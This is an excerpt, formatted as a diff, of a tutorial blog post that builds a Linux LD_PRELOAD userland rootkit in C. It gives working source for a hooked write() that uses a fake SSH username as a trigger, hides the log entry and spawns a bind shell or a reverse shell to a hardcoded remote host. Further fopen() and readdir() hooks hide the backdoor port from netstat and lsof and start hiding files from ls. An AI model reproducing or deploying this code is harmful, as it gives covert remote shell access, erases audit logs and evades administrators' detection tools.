+  <li><code class="language-plaintext highlighter-rouge">fildes = open("/dev/null", O_WRONLY | O_APPEND);</code> if it’s not <code class="language-plaintext highlighter-rouge">NULL</code>, then we have a match, we know we’re trying to activate the rootkit because we sent our magic string <code class="language-plaintext highlighter-rouge">notavaliduser4</code> as an SSH attempt. Of course that will fail, so <code class="language-plaintext highlighter-rouge">syslog</code> will log that and activate our hooked <code class="language-plaintext highlighter-rouge">write()</code> syscall. Since we have a match, we don’t actually want it written to log that we tried to do fishy stuff. So let’s re-route the <code class="language-plaintext highlighter-rouge">write()</code> operation by first using <code class="language-plaintext highlighter-rouge">open()</code> to open <code class="language-plaintext highlighter-rouge">/dev/null</code> in an append and write mode and then passing that return value to the <code class="language-plaintext highlighter-rouge">int filedes</code> variable we had already used in our function declaration. It should be mentioned that routing to <code class="language-plaintext highlighter-rouge">/dev/null</code> is just one solution, you could also just not <code class="language-plaintext highlighter-rouge">write()</code> at all. You are God here (well, userland God anyway);</li>
+  <li><code class="language-plaintext highlighter-rouge">result = new_write(fildes, buf, nbytes);</code> we now do a normal write operation on <code class="language-plaintext highlighter-rouge">/dev/null</code> and give the return value to our <code class="language-plaintext highlighter-rouge">ssize_t result</code> variable we defined in our function declaration. This <code class="language-plaintext highlighter-rouge">result</code> variable can now be delivered to follow on functions. <code class="language-plaintext highlighter-rouge">syslog</code> calls something like <code class="language-plaintext highlighter-rouge">open()</code> to open <code class="language-plaintext highlighter-rouge">auth.log</code> it then calls <code class="language-plaintext highlighter-rouge">write()</code> because it has a buffer it needs to put in the file (our failed SSH attempt) and then the write operation returns a result in the form of our variable <code class="language-plaintext highlighter-rouge">result</code> which is probably just an indication of completion or failure. To the process, nothing here is broken, it called write, and got a result as intended. Know that when <code class="language-plaintext highlighter-rouge">syslog</code> called <code class="language-plaintext highlighter-rouge">write()</code> here, it had values it used as arguments in place of the function declaration arugments. It didn’t pass <code class="language-plaintext highlighter-rouge">const void *buf</code> to <code class="language-plaintext highlighter-rouge">write()</code> when it called it for example, it passed it something like a pointer to a string that said “failed SSH attempt for…”;</li>
+  <li><code class="language-plaintext highlighter-rouge">ipv4_bind()</code> is the name of a function that is being called which binds a command shell to a listening port. That function is defined above in the program. We will show what that is later, but essentially it’s just our IPV4 TCP bind shell that we wrote in a previous assignment on port 65065.</li>
+</ul>
+
+<p>So, our trigger hit the write buffer, was written to <code class="language-plaintext highlighter-rouge">/dev/null</code> instead of <code class="language-plaintext highlighter-rouge">/var/log/auth.log</code>, a function opening a bind shell was called, and then finally we need to return the result to the calling process so it knows whether or not the <code class="language-plaintext highlighter-rouge">write()</code> function worked. We accomplish that with the last bit of code <code class="language-plaintext highlighter-rouge">return result;</code>.</p>
+
+<p>We have quite a few possiblities here. All in all, there are 4 distinct triggers for an IPv4 bindshell, IPv6 bindshell, IPv4 reverse-shell, and IPv6 reverse-shell. Let’s dig into those a bit. We won’t recapitulate the entire piece of code in each since we’ve already completed <a href="https://github.com/h0mbre/Learning-C/tree/master/Assignment-26">a bind shell</a>, but we’ll focus on the new aspects. Here is each function:</p>
+
+<h3 id="ipv4_bind-bind-shell"><code class="language-plaintext highlighter-rouge">ipv4_bind()</code> Bind Shell</h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kt">int</span> <span class="nf">ipv4_bind</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">addr</span><span class="p">;</span>
+    <span class="n">addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+    <span class="n">addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">LOC_PORT</span><span class="p">);</span>
+    <span class="n">addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">INADDR_ANY</span><span class="p">;</span>
+
+    <span class="kt">int</span> <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="k">const</span> <span class="k">static</span> <span class="kt">int</span> <span class="n">optval</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+
+    <span class="n">setsockopt</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">optval</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">optval</span><span class="p">));</span>
+
+    <span class="n">bind</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">));</span>
+
+    <span class="n">listen</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="kt">int</span> <span class="n">new_sockfd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">count</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="n">count</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">dup2</span><span class="p">(</span><span class="n">new_sockfd</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kt">char</span> <span class="n">input</span><span class="p">[</span><span class="mi">30</span><span class="p">];</span>
+
+    <span class="n">read</span><span class="p">(</span><span class="n">new_sockfd</span><span class="p">,</span> <span class="n">input</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">input</span><span class="p">));</span>
+    <span class="n">input</span><span class="p">[</span><span class="n">strcspn</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="n">PASS</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+        <span class="n">close</span><span class="p">(</span><span class="n">sockfd</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> 
+    <span class="p">{</span>
+        <span class="n">shutdown</span><span class="p">(</span><span class="n">new_sockfd</span><span class="p">,</span> <span class="n">SHUT_RDWR</span><span class="p">);</span>
+        <span class="n">close</span><span class="p">(</span><span class="n">sockfd</span><span class="p">);</span>
+    <span class="p">}</span>
+    
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The new code that wasn’t present in our last implementation of a bind shell, really starts in earnest with <code class="language-plaintext highlighter-rouge">read(new_sockfd, input, sizeof(input));</code>. You can see that a little earlier in the program we had declared a <code class="language-plaintext highlighter-rouge">char input[30]</code> variable. What we’re doing here is executing a <code class="language-plaintext highlighter-rouge">read()</code> syscall and passing it the file descriptor returned by our <code class="language-plaintext highlighter-rouge">accept()</code> command. So when someone makes a connection to our bind shell, we are reading their input.</p>
+
+<p>We use the <code class="language-plaintext highlighter-rouge">strcspn()</code> function, which returns the number of characters in the first argument string that exist before we reach the 2nd argument. So since the user would enter a password and then hit return, they would send something like <code class="language-plaintext highlighter-rouge">"reallygoodpassword\n"</code> as our <code class="language-plaintext highlighter-rouge">input</code>. <code class="language-plaintext highlighter-rouge">input[strcspn(input, "\n")] = 0;</code> says the value of the last index of the <code class="language-plaintext highlighter-rouge">input</code> variable is <code class="language-plaintext highlighter-rouge">0</code>, effectively null terminating our string for us by replacing the newline character with a null terminator. Let’s test out our theory here with this simple code where read input from <code class="language-plaintext highlighter-rouge">stdin</code> and store it in <code class="language-plaintext highlighter-rouge">input</code>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="n">input</span><span class="p">[</span><span class="mi">30</span><span class="p">];</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">input</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">input</span><span class="p">));</span>
+    <span class="n">input</span><span class="p">[</span><span class="n">strcspn</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"The input was %s"</span><span class="p">,</span> <span class="n">input</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Let’s compile and run this:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tokyo:~/LearningC/ # gcc test.c -o test
+tokyo:~/LearningC/ # ./test                                                                                                
+password
+The input was password#
+</code></pre></div></div>
+
+<p>So this is what we use to compare the user’s input to our hardcoded password defined by <code class="language-plaintext highlighter-rouge">PASS</code> with the <code class="language-plaintext highlighter-rouge">strcmp()</code> function.</p>
+
+<p>If <code class="language-plaintext highlighter-rouge">strcmp()</code> returns a <code class="language-plaintext highlighter-rouge">0</code>, indicating the arguments matched, the program issues an <code class="language-plaintext highlighter-rouge">execve()</code> call and pushes to the <code class="language-plaintext highlighter-rouge">/bin/sh</code> program to the connection giving the end user a command shell.</p>
+
+<p>If <code class="language-plaintext highlighter-rouge">strcmp()</code> returns a value other than <code class="language-plaintext highlighter-rouge">0</code>, indicating there was not a match between the arguments, the socket associated with the <code class="language-plaintext highlighter-rouge">accept()</code> syscall is shutdown, and the listening socket is closed.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">ipv6_rev()</code> function works very similarly except it has been programmed to deal strictly with IPv6 traffic.</p>
+
+<h3 id="ipv4_rev-reverse-shell"><code class="language-plaintext highlighter-rouge">ipv4_rev()</code> Reverse Shell</h3>
+<p>Below is the code block defining our IPv4 reverse shell function:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">ipv4_rev</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">host</span> <span class="o">=</span> <span class="n">REM_HOST4</span><span class="p">;</span>
+
+    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">addr</span><span class="p">;</span>
+    <span class="n">addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+    <span class="n">addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">REM_PORT</span><span class="p">);</span>
+    <span class="n">inet_aton</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">);</span>
+
+    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">client</span><span class="p">;</span>
+    <span class="n">client</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+    <span class="n">client</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">LOC_PORT</span><span class="p">);</span>
+    <span class="n">client</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">INADDR_ANY</span><span class="p">;</span>
+
+    <span class="kt">int</span> <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="n">bind</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">client</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">client</span><span class="p">));</span>
+
+    <span class="n">connect</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">));</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">count</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="n">count</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">dup2</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">sockfd</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">ipv4_rev()</code> function works very similarly to the bind shell we just explained; however, the remote host address and port have been hardcoded and defined by the <code class="language-plaintext highlighter-rouge">REM_HOST4</code> and <code class="language-plaintext highlighter-rouge">REM_PORT</code> definitions respectively.</p>
+
+<p>One other aspect of the reverse shell, is that we issue a <code class="language-plaintext highlighter-rouge">bind()</code> syscall with the following line: <code class="language-plaintext highlighter-rouge">bind(sockfd, (struct sockaddr*) &amp;client, sizeof(client));</code>. <code class="language-plaintext highlighter-rouge">client</code> in this case is a reference to our <code class="language-plaintext highlighter-rouge">client</code> struct of type <code class="language-plaintext highlighter-rouge">sockaddr</code> which describes the victim host (the client in a reverse shell paradigm). This line of code helps us ensure that the outgoing reverse shell connection is coming from a specific source port (<code class="language-plaintext highlighter-rouge">LOC_PORT</code> or <code class="language-plaintext highlighter-rouge">65065</code>) on the victim which will come in handy later when we are hiding connections from <code class="language-plaintext highlighter-rouge">/bin/netstat</code> based on a port number.</p>
+
+<p>The IPv6 reverse shell function works very similarly.</p>
+
+<h3 id="wrapping-up-our-write-hook">Wrapping Up Our <code class="language-plaintext highlighter-rouge">write()</code> Hook</h3>
+
+<p>We have hooked all <code class="language-plaintext highlighter-rouge">write()</code> calls system wide and have isolated <code class="language-plaintext highlighter-rouge">syslog</code> writing to the <code class="language-plaintext highlighter-rouge">/var/log/auth.log</code> file to log failed SSH attempts. We use a trigger word as our username, which tells the hooked command to either spawn a bind or reverse shell over either IPv4 or IPv6. We have a lot of options for our backdoor now.</p>
+
+<h2 id="hiding-from-netstat-and-lsof-">Hiding From <code class="language-plaintext highlighter-rouge">netstat</code> (and <code class="language-plaintext highlighter-rouge">lsof</code> ??)</h2>
+<p>Now that we have a functioning backdoor, it’s time to hide those connections from <code class="language-plaintext highlighter-rouge">netstat</code>. We’ve picked a high port for our shell functions so that the host is always using local port <code class="language-plaintext highlighter-rouge">65065</code> for our connections. This is a pretty random port to use so we will avoid a lot of false positives hopefully.</p>
+
+<p>To understand how to hide from these utilities, we first have to understand what syscalls they’re making when they’re run. Let’s open up a listener on <code class="language-plaintext highlighter-rouge">65065</code> and run <code class="language-plaintext highlighter-rouge">netstat</code> with <code class="language-plaintext highlighter-rouge">strace</code> to see what’s going on under the hood:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tokyo:~/LearningC/ # strace netstat -ano | grep -v unix                                                                     
+execve("/usr/bin/netstat", ["netstat", "-ano"], 0xbfd0de64 /* 47 vars */) = 0
+-----snip-----
+openat(AT_FDCWD, "/proc/net/tcp", O_RDONLY|O_LARGEFILE) = 3
+read(3, "  sl  local_address rem_address "..., 4096) = 450
+read(3, "", 4096)                       = 0
+close(3)                                = 0
+-----snip-----
+write(1, "Active Internet connections (ser"..., 4096Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
+tcp        0      0 0.0.0.0:65065           0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp6       0      0 :::65065                :::*                    LISTEN      off (0.00/0/0)
+tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           off (0.00/0/0)
+raw6       0      0 :::58                   :::*                    7           off (0.00/0/0)
+</code></pre></div></div>
+
+<p>So the first thing we’re seeing is that we use <code class="language-plaintext highlighter-rouge">execve()</code> to call it, we then see it opening <code class="language-plaintext highlighter-rouge">/proc/net/tcp</code> in read only mode and reading <code class="language-plaintext highlighter-rouge">450</code> bytes from the file and then closing. Later, it then writes all of that data to <code class="language-plaintext highlighter-rouge">stdout</code>. Pretty straight forward stuff.</p>
+
+<p>Let’s pop open <code class="language-plaintext highlighter-rouge">/proc/net/tcp</code> for ourselves and see what’s there:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tokyo:~/LearningC/ # cat /proc/net/tcp                                                                                      
+  sl  local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode                                                     
+   0: 00000000:FE29 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 107639 1 c563dbf8 100 0 0 10 0                            
+   1: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 73178 1 cb66d650 100 0 0 10 0               
+</code></pre></div></div>
+
+<p>So we see the same information that was printed to the terminal in hex representation. <code class="language-plaintext highlighter-rouge">FE29</code> is <code class="language-plaintext highlighter-rouge">65065</code> in hex and since we’re listening on the local <code class="language-plaintext highlighter-rouge">0.0.0.0</code> interface, it’s prepended by <code class="language-plaintext highlighter-rouge">00000000</code>. There is no remote address information because we’re not connected.</p>
+
+<p>So <code class="language-plaintext highlighter-rouge">netstat</code> reads this file and then stores that in a read buffer which is then interpreted and written to the terminal.</p>
+
+<p>We need a way to intercept a portion of this process and alter the results so that the <code class="language-plaintext highlighter-rouge">FE29</code> entries are not passed back to the end user of <code class="language-plaintext highlighter-rouge">netstat</code>. To accomplish this, I created an <code class="language-plaintext highlighter-rouge">fopen()</code> hook which is a higher-level wrapper function and not quite a syscall like <code class="language-plaintext highlighter-rouge">open()</code>. <code class="language-plaintext highlighter-rouge">netstat</code> actually calls <code class="language-plaintext highlighter-rouge">fopen()</code> which in turn calls lower level functions and syscalls. Here is the entire hook, and we will explain the whole thing:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">FILE</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">orig_fopen</span><span class="p">)(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">pathname</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">mode</span><span class="p">);</span>
+<span class="kt">FILE</span> <span class="o">*</span><span class="nf">fopen</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">pathname</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">mode</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">orig_fopen</span> <span class="o">=</span> <span class="n">dlsym</span><span class="p">(</span><span class="n">RTLD_NEXT</span><span class="p">,</span> <span class="s">"fopen"</span><span class="p">);</span>
+
+	<span class="kt">char</span> <span class="o">*</span><span class="n">ptr_tcp</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">pathname</span><span class="p">,</span> <span class="s">"/proc/net/tcp"</span><span class="p">);</span>
+
+	<span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
+
+	<span class="k">if</span> <span class="p">(</span><span class="n">ptr_tcp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+		<span class="kt">FILE</span> <span class="o">*</span><span class="n">temp</span> <span class="o">=</span> <span class="n">tmpfile</span><span class="p">();</span>
+		<span class="n">fp</span> <span class="o">=</span> <span class="n">orig_fopen</span><span class="p">(</span><span class="n">pathname</span><span class="p">,</span> <span class="n">mode</span><span class="p">);</span>
+		<span class="k">while</span> <span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">),</span> <span class="n">fp</span><span class="p">))</span>
+		<span class="p">{</span>
+			<span class="kt">char</span> <span class="o">*</span><span class="n">listener</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">KEY_PORT</span><span class="p">);</span>
+			<span class="k">if</span> <span class="p">(</span><span class="n">listener</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+			<span class="p">{</span>
+				<span class="k">continue</span><span class="p">;</span>
+			<span class="p">}</span>
+			<span class="k">else</span>
+			<span class="p">{</span>
+				<span class="n">fputs</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">temp</span><span class="p">);</span>
+			<span class="p">}</span>
+		<span class="p">}</span>
+		<span class="k">return</span> <span class="n">temp</span><span class="p">;</span>
+
+	<span class="p">}</span>
+
+	<span class="n">fp</span> <span class="o">=</span> <span class="n">orig_fopen</span><span class="p">(</span><span class="n">pathname</span><span class="p">,</span> <span class="n">mode</span><span class="p">);</span>
+	<span class="k">return</span> <span class="n">fp</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Let’s explain this line by line:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">FILE *(*orig_fopen)(const char *pathname, const char *mode);</code> we are declaring a pointer to the function <code class="language-plaintext highlighter-rouge">orig_fopen</code> which has the exact definition of the legitimate <code class="language-plaintext highlighter-rouge">fopen()</code> function. This will later become our reference to the real function;</li>
+  <li><code class="language-plaintext highlighter-rouge">FILE *fopen(const char *pathname, const char *mode)</code> this is our hook, this is what the calling program sees and recognizes as the offical definition of <code class="language-plaintext highlighter-rouge">fopen()</code>;</li>
+  <li><code class="language-plaintext highlighter-rouge">orig_fopen = dlsym(RTLD_NEXT, "fopen");</code> we are initializing the pointer we declared earlier. We now have the address of the real <code class="language-plaintext highlighter-rouge">fopen()</code> function so that we can pass execution to it when needed;</li>
+  <li><code class="language-plaintext highlighter-rouge">char *ptr_tcp = strstr(pathname, "/proc/net/tcp");</code> we are declaring a pointer that will be initialized if the <code class="language-plaintext highlighter-rouge">pathname</code> passed as an argument to <code class="language-plaintext highlighter-rouge">fopen()</code> by the calling program has a substring match with <code class="language-plaintext highlighter-rouge">"/proc/net/tcp"</code>;</li>
+  <li><code class="language-plaintext highlighter-rouge">FILE *fp;</code> we are using the <code class="language-plaintext highlighter-rouge">FILE</code> keyword to declare a pointer named <code class="language-plaintext highlighter-rouge">fp</code> that is of the <code class="language-plaintext highlighter-rouge">FILE</code> structure type. This will be normally the type of returned variable type of an <code class="language-plaintext highlighter-rouge">fopen()</code> function call so we need to initialize this with a <code class="language-plaintext highlighter-rouge">fopen()</code> call later;</li>
+  <li><code class="language-plaintext highlighter-rouge">if (ptr_tcp != NULL)</code> if there’s a match, and the file being opened is our <code class="language-plaintext highlighter-rouge">/proc/net/tcp</code>, do something;</li>
+  <li><code class="language-plaintext highlighter-rouge">char line[256];</code> we are declaring a character array of 255 bytes and a null terminator;</li>
+  <li><code class="language-plaintext highlighter-rouge">FILE *temp = tmpfile();</code> we are declaring AND initializing another <code class="language-plaintext highlighter-rouge">FILE</code> pointer, this one named <code class="language-plaintext highlighter-rouge">temp</code>, which points to a temporary file that lives in <code class="language-plaintext highlighter-rouge">/tmp</code> as long as <code class="language-plaintext highlighter-rouge">netstat</code> is running;</li>
+  <li><code class="language-plaintext highlighter-rouge">fp = orig_fopen(pathname, mode);</code> we’ve now finally initialized the <code class="language-plaintext highlighter-rouge">fp</code> <code class="language-plaintext highlighter-rouge">FILE</code> pointer and we have a pointer to the <code class="language-plaintext highlighter-rouge">/proc/net/tcp</code> file that’s been opened;</li>
+  <li><code class="language-plaintext highlighter-rouge">while (fgets(line, sizeof(line), fp))</code> we are using <code class="language-plaintext highlighter-rouge">fgets()</code> to grab a line of the <code class="language-plaintext highlighter-rouge">fp</code> (<code class="language-plaintext highlighter-rouge">/proc/net/tcp</code>) file at a time. As long as there are lines to grab (<code class="language-plaintext highlighter-rouge">while True</code>), do something;</li>
+  <li><code class="language-plaintext highlighter-rouge">char *listener = strstr(line, KEY_PORT);</code> we are declaring a pointer named <code class="language-plaintext highlighter-rouge">listener</code> that will be initialized if there is a substring match between the line we just collected from <code class="language-plaintext highlighter-rouge">/proc/net/tcp</code> and <code class="language-plaintext highlighter-rouge">KEY_PORT</code> which we have defined as <code class="language-plaintext highlighter-rouge">FE29</code> (the hex representation of <code class="language-plaintext highlighter-rouge">65065</code>);</li>
+  <li>Next, we have an <code class="language-plaintext highlighter-rouge">if</code> statement <code class="language-plaintext highlighter-rouge">if (listener != NULL)</code> so that if <code class="language-plaintext highlighter-rouge">listener</code> isn’t <code class="language-plaintext highlighter-rouge">NULL</code>, we <code class="language-plaintext highlighter-rouge">continue</code> meaning, we won’t actually do anything with that line, leave that line in the ether;</li>
+  <li>BUT, if the pointer isn’t <code class="language-plaintext highlighter-rouge">NULL</code>, we <code class="language-plaintext highlighter-rouge">fputs(line, temp);</code> which means that we place that line in our temporary file;</li>
+  <li><code class="language-plaintext highlighter-rouge">return temp;</code> here we just return <code class="language-plaintext highlighter-rouge">temp</code>, which is the result of our <code class="language-plaintext highlighter-rouge">fopen()</code> function to our temporary file, back to the end-user for futher processing;</li>
+  <li>finally, if <code class="language-plaintext highlighter-rouge">/proc/net/tcp</code> is NOT being opened, we simply pass execution to the real <code class="language-plaintext highlighter-rouge">fopen()</code> with <code class="language-plaintext highlighter-rouge">fp = orig_fopen(pathname, mode);</code> and <code class="language-plaintext highlighter-rouge">return fp;</code>.</li>
+</ul>
+
+<p>Phew, that was quite a bit. I was quite proud of this one, there is definitely a memory leak in here somewhere but it works! When the user calls <code class="language-plaintext highlighter-rouge">netstat</code> its going to open <code class="language-plaintext highlighter-rouge">/proc/net/tcp</code> our hook will then create a temporary file and copy everything BUT our malicious connection into the temporary file and then present that temporary file to the end user. As a bonus, that file only lives on disk in <code class="language-plaintext highlighter-rouge">/tmp</code> for as long as <code class="language-plaintext highlighter-rouge">netstat</code> runs, which is not very long. That owns.</p>
+
+<p>This hook also destroys <code class="language-plaintext highlighter-rouge">lsof</code> ability to check the port as well. I’m not quite sure how this is accomplished yet, but we’ve effectively hidden from two powerful utilities with our simple C.</p>
+
+<h2 id="hiding-from-binls">Hiding from <code class="language-plaintext highlighter-rouge">/bin/ls</code></h2>
+<p>After consulting some resources, namely <a href="https://gist.github.com/amitsaha/8169242">this explanation of ls here</a>, I knew I had to hook the <code class="language-plaintext highlighter-rouge">readdir()</code> function which again is a higher-level wrapper which calls <code class="language-plaintext highlighter-rouge">getdents()</code>. We can see this in the <code class="language-plaintext highlighter-rouge">strace</code> output:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tokyo:~/LearningC/ # strace /bin/ls                                                                                                     execve("/bin/ls", ["/bin/ls"], 0xbfbf4890 /* 47 vars */) = 0
+-----snip-----
+getdents64(3, /* 34 entries */, 32768)  = 1064
+getdents64(3, /* 0 entries */, 32768)   = 0
+close(3)  
+</code></pre></div></div>
+
+<p>We see that <code class="language-plaintext highlighter-rouge">getdents()</code> getting the directory entries for the <code class="language-plaintext highlighter-rouge">3</code> file descriptor and brings back <code class="language-plaintext highlighter-rouge">34</code> entries with a size of <code class="language-plaintext highlighter-rouge">1064</code>. So we have to figure out how <code class="language-plaintext highlighter-rouge">readdir()</code> works.</p>
+
+<p>The <a href="http://man7.org/linux/man-pages/man3/readdir.3.html">manpage</a> defines the function: <code class="language-plaintext highlighter-rouge">struct dirent *readdir(DIR *dirp);</code>.</p>
+
+<p>So it returns a pointer to the next <code class="language-plaintext highlighter-rouge">dirent</code> structure in the directory. Here is the definition in <code class="language-plaintext highlighter-rouge">glibc</code> of the <code class="language-plaintext highlighter-rouge">dirent</code> struct:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>struct dirent {
+               ino_t          d_ino;       /* Inode number */
+               off_t          d_off;       /* Not an offset; see below */
